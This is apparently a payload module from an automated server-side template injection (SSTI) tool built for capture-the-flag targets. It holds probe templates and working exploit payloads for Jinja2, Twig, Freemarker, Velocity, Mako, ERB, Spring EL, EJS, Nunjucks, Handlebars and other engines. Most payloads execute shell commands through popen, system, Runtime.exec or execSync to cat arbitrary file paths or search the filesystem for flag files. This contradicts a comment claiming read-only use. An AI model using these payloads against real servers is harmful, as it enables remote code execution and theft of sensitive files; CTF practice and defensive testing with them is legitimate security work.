# 目標 URL 沒有既有 query string 時，用來猜測 GET 注入點的候選參數名清單。
# 由 http_client.py 的 auto_discover 產生注入點時使用。
COMMON_GET_PARAMS = ['q', 'search', 'name', 'input', 'id', 'query',
                      'msg', 'message', 'data', 'path', 'page', 'text']

# 目標對基準請求沒有回任何 Set-Cookie 時，用來猜測 Cookie 注入點的候選 cookie
# 名稱清單。由 http_client.py 的 auto_discover 產生注入點時使用。
COMMON_COOKIE_NAMES = ['session', 'username', 'user', 'uid', 'name',
                        'token', 'lang', 'locale', 'theme', 'role',
                        'ssti_test']

MATH_PROBE_TEMPLATES = {
    # Jinja2 / Twig / Liquid 系：{{ }} 插值，用 Python/Twig 的 + 字串串接
    'jinja_concat': 'SSTI_{{TOKEN}}_START_{{ "" }}{{ ({{EXPR}}) }}SSTI_{{TOKEN}}_END_',
    # Java EL 系（Spring EL / Thymeleaf `${}`）：用 + 字串串接
    'dollar_concat': '${"SSTI_{{TOKEN}}_START_" + ({{EXPR}}) + "SSTI_{{TOKEN}}_END_"}',
    # Thymeleaf 內聯運算式 [[${}]]
    'thymeleaf_concat': '[[${"SSTI_{{TOKEN}}_START_" + ({{EXPR}}) + "SSTI_{{TOKEN}}_END_"}]]',
    # Freemarker：字串用 + 串接
    'freemarker_concat': '${"SSTI_{{TOKEN}}_START_" + ({{EXPR}}) + "SSTI_{{TOKEN}}_END_"}',
    # ERB / EJS：<%= %> 內為 Ruby/JS 運算式，用 + 串接
    'erb_concat': '<%= "SSTI_{{TOKEN}}_START_" + ({{EXPR}}).to_s + "SSTI_{{TOKEN}}_END_" %>',
    'ejs_concat': '<%= "SSTI_{{TOKEN}}_START_" + ({{EXPR}}) + "SSTI_{{TOKEN}}_END_" %>',
    # Smarty：直接把常數字串與運算式相鄰輸出（Smarty 的 {} 區塊本身就是輸出區）
    'smarty_concat': '{"SSTI_{{TOKEN}}_START_"}{ {{EXPR}} }{"SSTI_{{TOKEN}}_END_"}',
    # Pug 內聯 #{}：JS 運算式，用 + 串接
    'pug_concat': '#{"SSTI_{{TOKEN}}_START_" + ({{EXPR}}) + "SSTI_{{TOKEN}}_END_"}',
}

# ==================== 讀檔 payload（僅讀取，不提供任意命令執行）====================


FILE_READ_PAYLOADS = {
    'Jinja2': [
        "{{lipsum.__globals__['os'].popen('echo SSTI_{{TOKEN}}_START_; cat {{PATH}}; echo SSTI_{{TOKEN}}_END_').read()}}",
        "{{request.application.__globals__.__builtins__.__import__('os').popen('echo SSTI_{{TOKEN}}_START_; cat {{PATH}}; echo SSTI_{{TOKEN}}_END_').read()}}",
        "{{cycler.__init__.__globals__.os.popen('echo SSTI_{{TOKEN}}_START_; cat {{PATH}}; echo SSTI_{{TOKEN}}_END_').read()}}",
        "{{joiner.__init__.__globals__.os.popen('echo SSTI_{{TOKEN}}_START_; cat {{PATH}}; echo SSTI_{{TOKEN}}_END_').read()}}",
        "{{lipsum['__globals__']['os']['popen']('echo SSTI_{{TOKEN}}_START_; cat {{PATH}}; echo SSTI_{{TOKEN}}_END_')['read']()}}",
        "{{lipsum.__globals__['os'].popen('echo SSTI_{{TOKEN}}_START_; ' + 'cat' + ' {{PATH}}' + '; echo SSTI_{{TOKEN}}_END_').read()}}",
        "{{get_flashed_messages.__globals__.__builtins__.__import__('os').popen('echo SSTI_{{TOKEN}}_START_; cat {{PATH}}; echo SSTI_{{TOKEN}}_END_').read()}}",
        "{%set os=lipsum.__globals__.os%}{{os.popen('echo SSTI_{{TOKEN}}_START_; cat {{PATH}}; echo SSTI_{{TOKEN}}_END_').read()}}",
    ],
    'Twig': [
        '{{["echo SSTI_{{TOKEN}}_START_; cat {{PATH}}; echo SSTI_{{TOKEN}}_END_"]|filter("system")}}',
        '{{["echo SSTI_{{TOKEN}}_START_; cat {{PATH}}; echo SSTI_{{TOKEN}}_END_"]|filter("passthru")}}',
        '{{["echo SSTI_{{TOKEN}}_START_; cat {{PATH}}; echo SSTI_{{TOKEN}}_END_"]|map("system")|join}}',
    ],
    'Freemarker': [
        '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("echo SSTI_{{TOKEN}}_START_")}${ex("cat {{PATH}}")}${ex("echo SSTI_{{TOKEN}}_END_")}',
        '<#assign value="freemarker.template.utility.ObjectConstructor"?new()>${value("java.lang.ProcessBuilder",["/bin/sh","-c","echo SSTI_{{TOKEN}}_START_; cat {{PATH}}; echo SSTI_{{TOKEN}}_END_"]).start()}',
    ],
    'Velocity': [
        '#set($e="e")#set($rt=$e.getClass().forName("java.lang.Runtime"))#set($p=$rt.getMethod("getRuntime",null).invoke(null,null).exec(["/bin/sh","-c","echo SSTI_{{TOKEN}}_START_; cat {{PATH}}; echo SSTI_{{TOKEN}}_END_"]))#set($out=$p.getInputStream())#foreach($i in [1..4000])$out.read()#end',
    ],
    'Smarty': [
        '{php}echo "SSTI_{{TOKEN}}_START_"; echo file_get_contents("{{PATH}}"); echo "SSTI_{{TOKEN}}_END_";{/php}',
    ],
    'Mako': [
        '${self.module.runtime.util.os.popen("echo SSTI_{{TOKEN}}_START_; cat {{PATH}}; echo SSTI_{{TOKEN}}_END_").read()}',
        '<%\nimport os\nx = os.popen("echo SSTI_{{TOKEN}}_START_; cat {{PATH}}; echo SSTI_{{TOKEN}}_END_").read()\n%>${x}',
    ],
    'Ruby_ERB': [
        '<%= "SSTI_{{TOKEN}}_START_" + (File.read("{{PATH}}") rescue `cat {{PATH}}`) + "SSTI_{{TOKEN}}_END_" %>',
        '<%= "SSTI_{{TOKEN}}_START_" + IO.popen("cat {{PATH}}").read + "SSTI_{{TOKEN}}_END_" %>',
    ],
    'Spring_EL': [
        '${"SSTI_{{TOKEN}}_START_" + T(java.nio.file.Files).readString(T(java.nio.file.Paths).get("{{PATH}}")) + "SSTI_{{TOKEN}}_END_"}',
        '${"SSTI_{{TOKEN}}_START_" + new java.io.BufferedReader(new java.io.FileReader("{{PATH}}")).lines().collect(T(java.util.stream.Collectors).joining("\\n")) + "SSTI_{{TOKEN}}_END_"}',
    ],
    'Thymeleaf': [
        '[[${"SSTI_{{TOKEN}}_START_" + T(java.nio.file.Files).readString(T(java.nio.file.Paths).get("{{PATH}}")) + "SSTI_{{TOKEN}}_END_"}]]',
    ],
    'Pug': [
        '- var x = "SSTI_{{TOKEN}}_START_" + global.process.mainModule.require("fs").readFileSync("{{PATH}}","utf8") + "SSTI_{{TOKEN}}_END_"\n= x',
    ],
    'EJS': [
        '<%= "SSTI_{{TOKEN}}_START_" + global.process.mainModule.require("fs").readFileSync("{{PATH}}","utf8") + "SSTI_{{TOKEN}}_END_" %>',
        "<%= (function(){return 'SSTI_{{TOKEN}}_START_' + global.process.mainModule.require('fs').readFileSync('{{PATH}}','utf8') + 'SSTI_{{TOKEN}}_END_'})() %>",
    ],
    'Handlebars': [
        '{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}'
        '{{this.pop}}{{this.push (lookup string.sub "constructor")}}'
        '{{this.pop}}{{#with string.split as |codelist|}}'
        '{{this.pop}}{{this.push "return SSTI_{{TOKEN}}_START_ + require(\'fs\').readFileSync(\'{{PATH}}\',\'utf8\') + SSTI_{{TOKEN}}_END_;"}}'
        '{{this.pop}}{{#each conslist}}{{#with (string.sub.constructor.constructor (join this.push))}}{{this}}{{/with}}{{/each}}'
        '{{/with}}{{/with}}{{/with}}{{/with}}',
    ],
    'Nunjucks': [
        '{{ range.constructor("return \'SSTI_{{TOKEN}}_START_\' + require(\'fs\').readFileSync(\'{{PATH}}\',\'utf8\') + \'SSTI_{{TOKEN}}_END_\'")() }}',
    ],
    'Pebble': [
        "{% set x = 'SSTI_{{TOKEN}}_START_' %}{{ x }}"
        "{{ (\"cat {{PATH}}\").execute() }}"
        "{% set y = 'SSTI_{{TOKEN}}_END_' %}{{ y }}",
    ],
    'Liquid': [
        "{{ 'SSTI_{{TOKEN}}_START_' }}{{ '{{PATH}}' | read_file }}{{ 'SSTI_{{TOKEN}}_END_' }}",
    ],
    'Go_Template': [
        '{{printf "SSTI_{{TOKEN}}_START_%s SSTI_{{TOKEN}}_END_" (ReadFile "{{PATH}}")}}',
    ],
}

FLAG_SEARCH_COMMANDS = {
    'Jinja2': [
        "{{lipsum.__globals__['os'].popen(\"echo SSTI_{{TOKEN}}_START_; find / -maxdepth 4 -iname '*flag*' -type f 2>/dev/null; echo SSTI_{{TOKEN}}_END_\").read()}}",
        "{{request.application.__globals__.__builtins__.__import__('os').popen(\"echo SSTI_{{TOKEN}}_START_; find / -maxdepth 4 -iname '*flag*' -type f 2>/dev/null; echo SSTI_{{TOKEN}}_END_\").read()}}",
        "{{cycler.__init__.__globals__.os.popen(\"echo SSTI_{{TOKEN}}_START_; find / -maxdepth 4 -iname '*flag*' -type f 2>/dev/null; echo SSTI_{{TOKEN}}_END_\").read()}}",
        "{{joiner.__init__.__globals__.os.popen(\"echo SSTI_{{TOKEN}}_START_; find / -maxdepth 4 -iname '*flag*' -type f 2>/dev/null; echo SSTI_{{TOKEN}}_END_\").read()}}",
        "{{lipsum['__globals__']['os']['popen'](\"echo SSTI_{{TOKEN}}_START_; find / -maxdepth 6 -iname '*flag*' 2>/dev/null; echo SSTI_{{TOKEN}}_END_\")['read']()}}",
        "{%set os=lipsum.__globals__.os%}{{os.popen(\"echo SSTI_{{TOKEN}}_START_; find / -maxdepth 4 -iname '*flag*' -type f 2>/dev/null; echo SSTI_{{TOKEN}}_END_\").read()}}",
    ],
    'Twig': [
        '{{["echo SSTI_{{TOKEN}}_START_; find / -maxdepth 4 -iname \'*flag*\' -type f 2>/dev/null; echo SSTI_{{TOKEN}}_END_"]|filter("system")}}',
        '{{["echo SSTI_{{TOKEN}}_START_; find / -maxdepth 4 -iname \'*flag*\' -type f 2>/dev/null; echo SSTI_{{TOKEN}}_END_"]|filter("passthru")}}',
    ],
    'Freemarker': [
        '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("echo SSTI_{{TOKEN}}_START_")}${ex("find / -maxdepth 4 -iname \'*flag*\' -type f")}${ex("echo SSTI_{{TOKEN}}_END_")}',
    ],
    'Velocity': [
        '#set($e="e")#set($rt=$e.getClass().forName("java.lang.Runtime"))#set($p=$rt.getMethod("getRuntime",null).invoke(null,null).exec(["/bin/sh","-c","echo SSTI_{{TOKEN}}_START_; find / -maxdepth 4 -iname \'*flag*\' -type f 2>/dev/null; echo SSTI_{{TOKEN}}_END_"]))#set($out=$p.getInputStream())#foreach($i in [1..4000])$out.read()#end',
    ],
    'Mako': [
        '${self.module.runtime.util.os.popen("echo SSTI_{{TOKEN}}_START_; find / -maxdepth 4 -iname \'*flag*\' -type f 2>/dev/null; echo SSTI_{{TOKEN}}_END_").read()}',
    ],
    'Ruby_ERB': [
        '<%= "SSTI_{{TOKEN}}_START_" + `find / -maxdepth 4 -iname \'*flag*\' -type f 2>/dev/null` + "SSTI_{{TOKEN}}_END_" %>',
        '<%= "SSTI_{{TOKEN}}_START_" + IO.popen("find / -maxdepth 4 -iname \'*flag*\' -type f 2>/dev/null").read + "SSTI_{{TOKEN}}_END_" %>',
    ],
    'Spring_EL': [
        '${"SSTI_{{TOKEN}}_START_" + T(java.nio.file.Files).walk(T(java.nio.file.Paths).get("/")).filter(p -> p.toString().toLowerCase().contains("flag")).limit(20).collect(T(java.util.stream.Collectors).joining(",")) + "SSTI_{{TOKEN}}_END_"}',
    ],
    'Pug': [
        '- var cp = global.process.mainModule.require("child_process")\n- var x = "SSTI_{{TOKEN}}_START_" + cp.execSync("find / -maxdepth 4 -iname \'*flag*\' -type f 2>/dev/null").toString() + "SSTI_{{TOKEN}}_END_"\n= x',
    ],
    'EJS': [
        '<%= "SSTI_{{TOKEN}}_START_" + global.process.mainModule.require("child_process").execSync("find / -maxdepth 4 -iname \'*flag*\' -type f 2>/dev/null").toString() + "SSTI_{{TOKEN}}_END_" %>',
    ],
    'Nunjucks': [
        '{{ range.constructor("return \'SSTI_{{TOKEN}}_START_\' + require(\'child_process\').execSync(\'find / -maxdepth 4 -iname \\\'*flag*\\\' -type f 2>/dev/null\').toString() + \'SSTI_{{TOKEN}}_END_\'")() }}',
    ],
    'Pebble': [
        "{% set x = 'SSTI_{{TOKEN}}_START_' %}{{ x }}"
        "{{ (\"find / -maxdepth 4 -iname '*flag*' -type f 2>/dev/null\").execute() }}"
        "{% set y = 'SSTI_{{TOKEN}}_END_' %}{{ y }}",
    ],
}

FLAG_COMMON_PATHS = [
    '/flag', '/flag.txt', '/FLAG', '/flag.md',
    '/app/flag', '/app/flag.txt', 'flag', 'flag.txt',
    '/root/flag', '/root/flag.txt',
    '/tmp/flag', '/tmp/flag.txt',
    '/var/www/flag', '/var/www/html/flag.txt',
]
